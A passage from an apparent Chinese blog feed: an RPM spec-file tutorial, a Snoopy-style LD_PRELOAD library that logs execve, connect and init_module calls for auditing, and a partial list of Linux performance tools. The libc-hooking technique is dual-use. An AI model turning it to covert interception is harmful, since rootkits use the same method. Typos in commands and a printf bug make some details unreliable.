Domain（公共域），Distributable（贡献），commercial（商业），Share（共享）等，一般的开发都写GPL；</p></li><li><p>Group： 软件包所属类别，具体类别有：</p><ul><li>Amusements&#x2F;Games （娱乐&#x2F;游戏）</li><li>Amusements&#x2F;Graphics（娱乐&#x2F;图形）</li><li>Applications&#x2F;Archiving （应用&#x2F;文档）</li><li>Applications&#x2F;Communications（应用&#x2F;通讯）</li><li>Applications&#x2F;Databases （应用&#x2F;数据库）</li><li>Applications&#x2F;Editors （应用&#x2F;编辑器）</li><li>Applications&#x2F;Emulators （应用&#x2F;仿真器）</li><li>Applications&#x2F;Engineering （应用&#x2F;工程）</li><li>Applications&#x2F;File （应用&#x2F;文件）</li><li>Applications&#x2F;Internet （应用&#x2F;因特网）</li><li>Applications&#x2F;Multimedia（应用&#x2F;多媒体）</li><li>Applications&#x2F;Productivity （应用&#x2F;产品）</li><li>Applications&#x2F;Publishing（应用&#x2F;印刷）</li><li>Applications&#x2F;System（应用&#x2F;系统）</li><li>Applications&#x2F;Text （应用&#x2F;文本）</li><li>Development&#x2F;Debuggers （开发&#x2F;调试器）</li><li>Development&#x2F;Languages （开发&#x2F;语言）</li><li>Development&#x2F;Libraries （开发&#x2F;函数库）</li><li>Development&#x2F;System （开发&#x2F;系统）</li><li>Development&#x2F;Tools （开发&#x2F;工具）</li><li>Documentation （文档）</li><li>System Environment&#x2F;Base（系统环境&#x2F;基础）</li><li>System Environment&#x2F;Daemons （系统环境&#x2F;守护）</li><li>System Environment&#x2F;Kernel （系统环境&#x2F;内核）</li><li>System Environment&#x2F;Libraries （系统环境&#x2F;函数库）</li><li>System Environment&#x2F;Shells （系统环境&#x2F;接口）</li><li>User Interface&#x2F;Desktops（用户界面&#x2F;桌面）</li><li>User Interface&#x2F;X （用户界面&#x2F;X窗口）</li><li>User Interface&#x2F;X Hardware Support （用户界面&#x2F;X硬件支持）</li></ul></li><li><p>Source：源程序软件包的名字。如 stardict-2.0.tar.gz；</p></li><li><p>%define：定义宏，例如<code>%define test 10</code>，这里定义了一个宏，名称为test，值为10，要使用这个宏，使用<code>%&#123;testMacro&#125;</code>或者<code>%testMacro</code>；</p></li><li><p>%description：软件包详细说明，可写在多个行上；</p></li></ul><h3 id="2-2-2-prep"><a href="#2-2-2-prep" class="headerlink" title="2.2.2 %prep"></a>2.2.2 %prep</h3><p>预处理段，通常用来执行一些解开源程序包的命令，为下一步的编译安装作准备，%prep和下面的%build，%install段一样，除了可以执行RPM所定义的宏命令（以%开头）以外，还可以执行Shell命令，命令可以有很多行；</p><h3 id="2-2-3-setup"><a href="#2-2-3-setup" class="headerlink" title="2.2.3 %setup"></a>2.2.3 %setup</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%setup 不加任何选项，仅将软件包打开。</span><br><span class="line">%setup -n newdir 将软件包解压在newdir目录。</span><br><span class="line">%setup -c 解压缩之前先产生目录。</span><br><span class="line">%setup -b num 将第num个<span class="built_in">source</span>文件解压缩。</span><br><span class="line">%setup -T 不使用default的解压缩操作。</span><br><span class="line">%setup -T -b 0 将第0个源代码文件解压缩。</span><br><span class="line">%setup -c -n newdir 指定目录名称newdir，并在此目录产生rpm套件。</span><br><span class="line">%patch 最简单的补丁方式，自动指定patch level。</span><br><span class="line">%patch0 -p0 打第1个补丁，利用当前相对路径名称</span><br><span class="line">%pacth1 -p2 打第2个补丁，忽略补丁文件第一层目录</span><br><span class="line">%patch 0 使用第0个补丁文件，相当于%patch ?p 0。</span><br><span class="line">%patch -s 不显示打补丁时的信息。</span><br><span class="line">%patch -T 将所有打补丁时产生的输出文件删除。</span><br></pre></td></tr></table></figure><h3 id="2-2-4-build"><a href="#2-2-4-build" class="headerlink" title="2.2.4 %build"></a>2.2.4 %build</h3><p>所要执行的命令为生成软件包服务，如make 命令</p><h3 id="2-2-5-install"><a href="#2-2-5-install" class="headerlink" title="2.2.5 %install"></a>2.2.5 %install</h3><p>将软件安装到虚拟根目录，其中的命令在安装软件包时将执行，如make install命令</p><h3 id="2-2-6-clean"><a href="#2-2-6-clean" class="headerlink" title="2.2.6 %clean"></a>2.2.6 %clean</h3><p>清理一些临时文件，或是生产中不需要的文件</p><h3 id="2-2-7-files"><a href="#2-2-7-files" class="headerlink" title="2.2.7 %files"></a>2.2.7 %files</h3><p>指定安装时需要安装的文件列表，可以指定文件、目录，也可以使用通配符等。用于定义软件包所包含的文件，分为三类–说明文档（doc），配置文件（config）及执行程序，还可定义文件存取权限，拥有者及组别；</p><h3 id="2-2-8-changelog"><a href="#2-2-8-changelog" class="headerlink" title="2.2.8 %changelog"></a>2.2.8 %changelog</h3><p>修改日志，你可以将软件的每次修改记录到这里，保存到发布的软件包中，以便查询之用。每一个修改日志都有这样一种格式：第一行是：* 星期 月 日 年 修改人 电子信箱。其中：星期、月份均用英文形式的前3个字母，用中文会报错。接下来的行写的是修改了什么地方，可写多行。一般以减号开始，便于后续的查阅；</p><h1 id="三、相关指令"><a href="#三、相关指令" class="headerlink" title="三、相关指令"></a>三、相关指令</h1><h2 id="3-1-打包指令"><a href="#3-1-打包指令" class="headerlink" title="3.1 打包指令"></a>3.1 打包指令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只生成二进制格式的rpm包（生成的文件会在对应的RPM目录下存在）</span></span><br><span class="line">rpmbuild -bb xxx.spec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只生成src格式的rpm包（生成的文件会在刚才建立的SRPM目录下存在）</span></span><br><span class="line">rpmbuild -bs xxx.spec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只需要生成完整的源文件（源文件存在目录BUILD下）</span></span><br><span class="line">rpmbuild -bp xxx.spec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完全打包（产生以上3个过程分别生成的包。存放在相应的目录下）</span></span><br><span class="line">rpmbuild -ba xxx.spec</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-2-解析包相关指令"><a href="#3-2-解析包相关指令" class="headerlink" title="3.2 解析包相关指令"></a>3.2 解析包相关指令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出rpm包包含的内容</span></span><br><span class="line">rpm -qpl *.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压缩出rpm包</span></span><br><span class="line">rpm2cpio *.rpm | cpio -div</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装spec文件中的所有编译依赖软件，BuidRequires</span></span><br><span class="line">yum-duilddep *.spec</span><br></pre></td></tr></table></figure><h1 id="四-示例"><a href="#四-示例" class="headerlink" title="四 示例"></a>四 示例</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name:       clutter-gtk</span><br><span class="line">Summary:    A basic GTK clutter widget</span><br><span class="line">Version:    0.11.4</span><br><span class="line">Release:    1.18</span><br><span class="line">Group:      System/Libraries</span><br><span class="line">License:    LGPLv2</span><br><span class="line">URL:        http://www.clutter-project.org/</span><br><span class="line">Source0:    http://www.clutter-project.org/sources/clutter-gtk/0.11/%&#123;name&#125;-%&#123;version&#125;.tar.bz2</span><br><span class="line">Source100:  clutter-gtk.yaml</span><br><span class="line">Requires(post): /sbin/ldconfig</span><br><span class="line">Requires(postun): /sbin/ldconfig</span><br><span class="line">BuildRequires:  pkgconfig(clutter-1.0)</span><br><span class="line">BuildRequires:  pkgconfig(glib-2.0)</span><br><span class="line">BuildRequires:  pkgconfig(gl)</span><br><span class="line">BuildRequires:  pkgconfig(gtk+-2.0)</span><br><span class="line">BuildRequires:  pkgconfig(cairo)</span><br><span class="line">BuildRequires:  pkgconfig(pango)</span><br><span class="line">BuildRequires:  pkgconfig(atk)</span><br><span class="line">/* 这里增加了一个patch  </span><br><span class="line"> * 打patch 方法 diff -Nur old new&gt;add-gthread.patch</span><br><span class="line"> */</span><br><span class="line">Patch0:add-gthread.patch</span><br><span class="line"></span><br><span class="line">%description</span><br><span class="line">This library allows </span><br><span class="line"></span><br><span class="line">/* 这里为添加开发包相关信息的位置 */</span><br><span class="line">%package devel</span><br><span class="line">Summary:    Clutter-Gtk header files and development libraries </span><br><span class="line">Group:      Development/Libraries                                     </span><br><span class="line">Requires:   %&#123;name&#125; = %&#123;version&#125;-%&#123;release&#125; </span><br><span class="line"></span><br><span class="line">%description devel </span><br><span class="line">Development environment <span class="keyword">for</span> clutter-gtk</span><br><span class="line"></span><br><span class="line">%prep</span><br><span class="line"></span><br><span class="line">/**setup 参数***************************</span><br><span class="line">%setup 不加任何选项，仅将软件包打开。</span><br><span class="line">%setup -n newdir 将软件包解压在newdir目录。</span><br><span class="line">%setup -c 解压缩之前先产生目录。</span><br><span class="line">%setup -b num 将第num个<span class="built_in">source</span>文件解压缩。</span><br><span class="line">%setup -T 不使用default的解压缩操作。</span><br><span class="line">%setup -T -b 0 将第0个源代码文件解压缩。</span><br><span class="line">%setup -c -n newdir 指定目录名称newdir，并在此目录产生rpm套件。</span><br><span class="line">%patch 最简单的补丁方式，自动指定patch level。</span><br><span class="line">%patch 0 使用第0个补丁文件，相当于%patch ?p 0。</span><br><span class="line">%patch -s 不显示打补丁时的信息。</span><br><span class="line">%patch -T 将所有打补丁时产生的输出文件删除。</span><br><span class="line">*************************************/</span><br><span class="line">%setup -q -n %&#123;name&#125;-%&#123;version&#125; </span><br><span class="line">/* 如果原来只有一个“Patch:”,您增加“Patch1:”,则在SPEC文件%setup行后面的</span><br><span class="line">   %patch -p1后面新增一行: %patch1 -p1 依此类推.</span><br><span class="line"> */</span><br><span class="line">%patch0 -p1</span><br><span class="line"></span><br><span class="line">%build </span><br><span class="line">%configure --disable-static </span><br><span class="line">make %&#123;?<span class="built_in">jobs</span>:-j%<span class="built_in">jobs</span>&#125; </span><br><span class="line"></span><br><span class="line">%install </span><br><span class="line">%make_install</span><br><span class="line">/usr/lib/rpm/brp-strip-shared   /* 如果为库文件过大，可以加入此行，去除debug信息 */</span><br><span class="line"></span><br><span class="line">%files </span><br><span class="line">%defattr(-,root,root,-) </span><br><span class="line">%doc AUTHORS ChangeLog COPYING NEWS </span><br><span class="line">%&#123;_libdir&#125;/libclutter-gtk-*.so*.0 </span><br><span class="line"></span><br><span class="line">%files devel %defattr(-,root,root,-)</span><br><span class="line">%&#123;_libdir&#125;/pkgconfig/*.pc </span><br><span class="line">%&#123;_includedir&#125;/clutter-gtk-0.12/clutter-gtk</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用snoopy进行execve/execv、connect、init_module hook</title>
      <link href="/2019/01/01/snoopy/"/>
      <url>/2019/01/01/snoopy/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><a href="https://github.com/a2o/snoopy">Snoopy</a>旨在通过提供已执行命令的日志来帮助系统管理员，它对用户和应用程序是完全透明，通过将它链接到程序中，以提供对<code>execve()</code>调用的封装，记录信息通过<code>syslog</code>完成。</p><blockquote><p>Snoopy development has been migrated to github. Please follow the link “Snoopy Logger Web Site” below.</p><p>Snoopy is designed to aid a sysadmin by providing a log of commands executed. Snoopy is completely transparent to the user and applications. It is linked into programs to provide a wrapper around calls to execve(). Logging is done via syslog.</p></blockquote><h2 id="二、注意事项"><a href="#二、注意事项" class="headerlink" title="二、注意事项"></a>二、注意事项</h2><ul><li>Hook函数的覆盖完备性，对于Linux下的指令执行来说，有7个glibc的api都可实现指令执行功能，对这些API对要进行hook：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 执行参数filename字符串所代表的文件路径，第二个参数是利用数组指针来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组，该函数属于内核级系统调用；</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename， <span class="type">char</span> *<span class="type">const</span> argv[]， <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br><span class="line"><span class="comment">// 执行参数filename字符串所代表的文件路径，第二个参数代表执行该文件时传递的argv[0],argv[1].....最后一个参数必须用空指针NULL作结束，该函数需要调用execve的库函数；</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename， <span class="type">const</span> <span class="type">char</span> *arg0， ... <span class="comment">/* (char *)0 */</span> )</span>;</span><br><span class="line"><span class="comment">// 内核级系统调用</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename， <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="comment">// 内核级系统调用</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename， <span class="type">const</span> <span class="type">char</span> *arg0， ...<span class="comment">/* (char *)0， char *const envp[] */</span> )</span>;</span><br><span class="line"><span class="comment">// 内核级系统调用</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename， <span class="type">const</span> <span class="type">char</span> *arg0， ... <span class="comment">/* (char *)0 */</span> )</span>;</span><br><span class="line"><span class="comment">// 内核级系统调用</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename， <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fexecve</span><span class="params">(<span class="type">int</span> fd， <span class="type">char</span> *<span class="type">const</span> argv[]， <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><ul><li>系统中是否存在hook函数的重名覆盖问题，通常在以下场景下：<ul><li><code>/etc/ld.so.preload</code>中填写了多条.so加载条目；</li><li>其他程序通过<code>export LD_PRELOAD=..</code>临时指定了待加载so的路径，在很多情况下，出于系统管理或者集群系统日志收集的目的，运维人员会向系统中注入.so文件，对特定function函数进行hook，这个时候，当我们注入的.so文件中的hook函数和原有的hook函数存在同名的情况，Linux会自动忽略之后载入了hook函数，这种情况我们称之为”共享对象全局符号介入”；</li></ul></li><li>注入<code>.so</code>对特定函数进行hook要保持原始业务的兼容性，即处理完之后仍然需要执行原函数的调用，为了实现透明hook(完成业务逻辑的同时不影响正常的系统行为)、维持调用链，那么需要使用<a href="%5Bhttp://www.tecyle.com/2017/03/03/dlsym%E5%8F%82%E6%95%B0-rtld_next%E8%AF%A6%E8%A7%A3/%5D(http://www.tecyle.com/2017/03/03/dlsym%E5%8F%82%E6%95%B0-rtld_next%E8%AF%A6%E8%A7%A3/)">RTLD_NEXT</a>；</li><li>尽量减小hook函数对原有调用逻辑的延时，hook操作本身也会产生一定的延时，我们需要尽量减少从函数入口到调用原函数这块的代码逻辑，尽量减少多余的执行时间；</li></ul><h1 id="三、代码实践"><a href="#三、代码实践" class="headerlink" title="三、代码实践"></a>三、代码实践</h1><ul><li>hook.c</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(RTLD_NEXT)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> REAL_LIBC RTLD_NEXT</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> REAL_LIBC ((void *) -1L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FN(ptr, type, name, args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="title function_">int</span> <span class="params">(*func)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **, <span class="type">char</span> **)</span>;</span><br><span class="line">    FN(func,<span class="type">int</span>,<span class="string">&quot;execve&quot;</span>,(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **<span class="type">const</span>, <span class="type">char</span> **<span class="type">const</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the log</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;filename: %s, argv[0]: %s, envp:%s\n&quot;</span>, filename, argv[<span class="number">0</span>], envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (*func) (filename, (<span class="type">char</span>**) argv, (<span class="type">char</span> **) envp);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[])</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="title function_">int</span> <span class="params">(*func)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **)</span>;</span><br><span class="line">    FN(func,<span class="type">int</span>,<span class="string">&quot;execv&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **<span class="type">const</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the log</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;filename: %s, argv[0]: %s\n&quot;</span>, filename, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (*func) (filename, (<span class="type">char</span> **) argv);</span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span> &#123; </span><br><span class="line">    <span class="type">static</span> <span class="title function_">int</span> <span class="params">(*func)</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *, <span class="type">socklen_t</span>)</span>;</span><br><span class="line">    FN(func,<span class="type">int</span>,<span class="string">&quot;connect&quot;</span>, (<span class="type">int</span>, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *, <span class="type">socklen_t</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print the log, 获取、打印参数信息的时候需要注意</span></span><br><span class="line"><span class="comment">     * 1. 加锁</span></span><br><span class="line"><span class="comment">     * 2. 拷贝到本地栈区变量中</span></span><br><span class="line"><span class="comment">     * 3. 然后再打印</span></span><br><span class="line"><span class="comment">     * 调试的时候发现直接获取打印会导致core dump */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;socket connect hooked!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return (*func) (sockfd, (const struct sockaddr *) addr, (socklen_t)addrlen);</span></span><br><span class="line">    <span class="keyword">return</span> (*func) (sockfd, addr, addrlen);</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span> *module_image, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">const</span> <span class="type">char</span> *param_values)</span> &#123; </span><br><span class="line">    <span class="type">static</span> <span class="title function_">int</span> <span class="params">(*func)</span><span class="params">(<span class="type">void</span> *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line">    FN(func,<span class="type">int</span>,<span class="string">&quot;init_module&quot;</span>,(<span class="type">void</span> *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">const</span> <span class="type">char</span> *)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the log, lkm的加载不需要取参数，只需要捕获事件本身即可</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lkm load hooked!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (*func) ((<span class="type">void</span> *)module_image, (<span class="type">unsigned</span> <span class="type">long</span>)len, (<span class="type">const</span> <span class="type">char</span> *)param_values);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编译运行：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc -fPIC -shared -o hook.so hook.c -ldl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">LD_PRELOAD=./hook.so nc www.baidu.com 80  </span><br></pre></td></tr></table></figure><ul><li>运行结果：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socket connect hooked!!</span><br><span class="line">socket connect hooked!!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux操作系统知识点整理</title>
      <link href="/2018/12/12/linux-tools-notes/"/>
      <url>/2018/12/12/linux-tools-notes/</url>
      
        <content type="html"><![CDATA[<h1 id="一、系统工具相关"><a href="#一、系统工具相关" class="headerlink" title="一、系统工具相关"></a>一、系统工具相关</h1><h3 id="1-1、CPU性能工具："><a href="#1-1、CPU性能工具：" class="headerlink" title="1.1、CPU性能工具："></a>1.1、CPU性能工具：</h3><ul><li>平均负载：<ul><li><code>uptime</code>：最简单；</li><li><code>top</code>：提供了最全的指标；</li><li><code>/proc/loadavg</code>：常用于监控系统；</li></ul></li><li>系统CPU使用率：<ul><li><code>vmstat</code>：只可以动态查看；</li><li><code>mpstat</code>：只可以动态查看；</li><li><code>top</code>：只可以动态查看；</li><li><code>sar</code>：不仅可以动态查看，还可以记录历史数据；</li><li><code>/proc/stat</code>：是其他性能工具的数据来源，也可用于监控；</li></ul></li><li>进程CPU使用率：<ul><li><code>top</code>：可以按照CPU使用率给进程排序；</li><li><code>ps</code>：可以按照CPU使用率给进程排序；</li><li><code>pidstat</code>：只显示实际用了CPU的进程；</li><li><code>htop</code>：可以以不同的颜色显示，更加直观；</li><li><code>atop</code>：可以以不同的颜色显示，更加直观；</li></ul></li><li>系统上下文切换：<ul><li><code>vmstat</code>：除了上下文切换的次数，还提供运行状态和不可中断状态进程的数量；</li></ul></li><li>进程上下文切换：<ul><li><code>pidstat</code>：注意加上-w选项；</li></ul></li><li>软中断：<ul><li><code>top</code>：提供软中断CPU的使用率；</li><li><code>mpstat</code>：提供了各种软中断在每个CPU上的运行次数；</li><li><code>/proc/softirps</code>：提供了各种软中断在每个CPU上的运行次数；</li></ul></li><li>硬中断：<ul><li><code>vmstat</code>：提供总的中断次数；</li><li><code>/proc/interrupts</code>：提供各种中断在每个CPU上的运行的累积次数；</li></ul></li><li>网络：<ul><li><code>dstat</code>：提供总的网络接收和发送情况；</li><li><code>sar</code>：提供总的网络接收和发送情况；</li><li><code>tcpdump</code>：动态的抓取正在运行的网络通讯；</li></ul></li><li>IO：<ul><li><code>dstat</code>：提供了I&#x2F;O的整体情况；</li><li><code>sar</code>：提供了I&#x2F;O的整体情况；</li></ul></li><li>CPU缓存：<ul><li><code>perf</code>：使用perf stat的子命令；</li></ul></li><li>CPU数：<ul><li><code>lscpu</code>：lscpu更加直观；</li><li><code>/proc/cpuinfo</code>：</li></ul></li><li>事件刨析：<ul><li><code>perf</code>：用来分析热点函数以及调用栈；</li><li><code>火焰图</code>：用来分析热点函数以及调用栈；</li><li><code>execsnoop</code>：用来监测短时进程；</li></ul></li><li>动态追踪：<ul><li><code>ftrace</code>：用来追踪内核函数的调用栈；</li><li><code>bcc</code>：用于跟踪内核或应用程序的执行过程，要求内核版本&gt;&#x3D;4.1</li><li><code>systemtab</code>：用于跟踪内核或应用程序的执行过程</li></ul></li></ul><h3 id="1-2、内存性能工具："><a href="#1-2、内存性能工具：" class="headerlink" title="1.2、内存性能工具："></a>1.2、内存性能工具：</h3><ul><li>系统已用&#x2F;可用&#x2F;剩余内存：<ul><li><code>free</code>：最为简单；</li><li><code>vmstat</code>：更为全面；</li><li><code>sar</code>：更为全面；</li><li><code>/proc/meminfo</code>：其他工具的数据来源，也常用于监控系统中；</li></ul></li><li>进程虚拟&#x2F;常驻&#x2F;共享内存：<ul><li><code>ps</code>：最为简单；</li><li><code>top</code>：最为简单；</li><li><code>pidstat</code>：需要加上-r选项；</li><li><code>/proc/pid/stat</code>：是其他工具的数据来源，也常用于监控系统中；</li><li><code>/proc/pid/status</code>：是其他工具的数据来源，也常用于监控系统中；</li></ul></li><li>进程内存分布：<ul><li><code>pmap</code>：</li><li><code>/proc/pid/maps</code>：是pmap的数据来源；</li></ul></li><li>进程Swap换出内存：<ul><li><code>top</code>：</li><li><code>/proc/pid/status</code>：是top的数据来源；</li></ul></li><li>进程缺页异常：<ul><li><code>ps</code>：</li><li><code>top</code>：</li><li><code>pidstat</code>：注意给pidstat加上-r选项；</li></ul></li><li>系统换页情况：<ul><li><code>sar</code>：注意加上-B选项；</li></ul></li><li>缓存&#x2F;缓冲区用量：<ul><li><code>free</code>：</li><li><code>vmstat</code>：最为常用；</li><li><code>sar</code>：</li><li><code>cachestat</code>：需要安装bcc；</li></ul></li><li>缓存&#x2F;缓冲区命中率：<ul><li><code>cachetop</code>：需要安装bcc；</li></ul></li><li>Swap已用空间和剩余空间：<ul><li><code>free</code>：最为简单；</li><li><code>sar</code>：还可以记录历史；</li></ul></li><li>Swap换入换出：<ul><li><code>vmstat</code>：最为简单；</li><li><code>sar</code>：还可以记录历史；</li></ul></li><li>内存泄漏监测：<ul><li><code>memleak</code>：需要安装bcc；</li><li><code>valgrind</code>：还可以在旧版本（如3.x）内核中使用；</li></ul></li><li>指定文件的缓存大小：<ul><li><code>pcstat</code>：需要从源码下载安装；</li></ul></li></ul><h3 id="1-3、文件系统和磁盘I-x2F-O性能工具"><a href="#1-3、文件系统和磁盘I-x2F-O性能工具" class="headerlink" title="1.3、文件系统和磁盘I&#x2F;O性能工具"></a>1.3、文件系统和磁盘I&#x2F;O性能工具</h3><ul><li>文件系统空闲容量、使用量以及剩余空间：<ul><li><code>df</code>：详细文档可以执行 info coreutils ‘df invocation’ 命令进程查询；</li></ul></li><li>索引节点容量、使用量以及剩余量：<ul><li><code>df</code>：注意加上 -i 选项；</li></ul></li><li>叶缓存和可回收Slab缓存：<ul><li><code>/proc/meminfo</code>：是其他工具的数据来源，也常用于监控；</li><li><code>sar</code>：注意加上 -r 选项；</li><li><code>vmstat</code>：</li></ul></li><li>缓冲区：<ul><li><code>/proc/meminfo</code>：是其他工具的数据来源，也常用于监控；</li><li><code>sar</code>：注意加上 -r 选项；</li><li><code>vmstat</code>：</li></ul></li><li>目录页、索引节点以及文件系统的缓存：<ul><li><code>/proc/slabinfo</code>：常用于监控；</li><li><code>slabtop</code>：slabtop更加直观；</li></ul></li><li>磁盘I&#x2F;O使用率、IOPS、吞吐量、响应时间、I&#x2F;O平均大小以及等待队列长度：<ul><li><code>iostat</code>：最为常用，注意使用 iostat -d -x 选项；</li><li><code>sar</code>：注意使用 sar -d 选项；</li><li><code>dstat</code>：</li><li><code>/proc/diskstats</code>：是其他工具的数据来源，也常用于监控；</li></ul></li><li>进程I&#x2F;O大小以及I&#x2F;O延迟：<ul><li><code>pidstat</code>：注意使用 pidstat -d 选项；</li><li><code>iotop</code>：</li></ul></li><li>块设备I&#x2F;O事件追踪：<ul><li><code>blktrace</code>：需要跟 blkparse 配合使用，比如 blktrace -d &#x2F;dev&#x2F;sda -o | blkparse -i</li></ul></li><li>进程I&#x2F;O系统调用跟踪：<ul><li><code>strace</code>：只可以跟踪单个进程；</li><li><code>perf trace</code>：可以跟踪所有进程的系统调用；</li></ul></li><li>进程块设备I&#x2F;O大小跟踪：<ul><li><code>biosnoop</code>：需要安装bcc；</li><li><code>biotop</code>：需要安装bcc；</li></ul></li><li>动态追踪：<ul><li><code>ftrace</code>：用于跟踪内核函数调用栈；</li><li><code>bcc</code>：用于跟踪内核或应用程序的执行过程（要求内核版本&gt;&#x3D;4.1）；</li><li><code>systemtab</code>：用于跟踪内核或应用程序的执行过程；</li></ul></li></ul><h3 id="1-4、网络性能工具"><a href="#1-4、网络性能工具" class="headerlink" 